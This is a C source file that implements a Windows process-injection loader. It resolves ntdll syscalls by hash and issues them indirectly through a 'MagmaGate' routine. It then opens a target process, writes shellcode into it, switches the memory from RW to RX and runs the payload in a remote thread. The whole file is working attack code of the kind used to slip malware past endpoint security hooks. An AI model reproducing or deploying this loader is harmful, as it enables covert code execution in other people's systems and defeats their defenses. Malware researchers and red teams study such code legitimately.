#include "IS.h"
#include "box.h"

/*-----------------------------------------------------[Indirect Syscalls]------------------------------------------------------*/


BOOL IndirectShellInjection(
	_In_ CONST DWORD PID,
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)

{


	NTSTATUS		STATUS = NULL;
	HANDLE		  hProcess = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	HMODULE    NtdllHandle = NULL;
	DWORD       OldProtection = 0;
	SIZE_T       BytesWritten = 0;
	SIZE_T origSize = sSizeofShellcode;
	SIZE_T regionSize = sSizeofShellcode;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[8] = { 0 };

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtOpenProcess",
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"NtWaitForSingleObject",
		"NtFreeVirtualMemory",
		"NtClose"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}


	/*--------------------------------------------------[Externally calling all function from Magma.asm]-------------------------------------------------------*/

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtOpenProcess
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))SyscallInvoker)
		(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtAllocateVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
		(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);


	/*------------------------------------------------------------------------[Writing Shellcode to Virtual Memory]-----------------------------------------------------------*/


	// Write the newly decrypted shellcode inside
	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtWriteVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
		(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtProtectVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
		(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RX]");

	SetConfig(syscallInfos[4].SSN, syscallInfos[4].SyscallInstruction); // NtCreateThreadEx
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
		(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	SetConfig(syscallInfos[5].SSN, syscallInfos[5].SyscallInstruction); // NtWaitForSingleObject
	STATUS = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
		(hThread, FALSE, NULL);
	INFO("Execution Completed! Cleaning Up!");




CLEANUP:


	if (rBuffer) {
		SetConfig(syscallInfos[6].SSN, syscallInfos[6].SyscallInstruction); // NtFreeVirtualMemory
		STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG))SyscallInvoker)
			(hProcess, &rBuffer, &sSizeofShellcode, MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
			WARN("NtFreeVirtualMemory", STATUS);
		}
		else {
			INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
		}
	}

	if (hThread) {
		SetConfig(syscallInfos[7].SSN, syscallInfos[7].SyscallInstruction); // NtClose
		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
		(hThread);
		INFO("[0x%p] handle on thread closed", hThread);
	}

	if (hProcess) {
		SetConfig(syscallInfos[7].SSN, syscallInfos[7].SyscallInstruction); // NtClose
		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
		(hProcess);
		INFO("[0x%p] handle on process closed", hProcess);


	}
}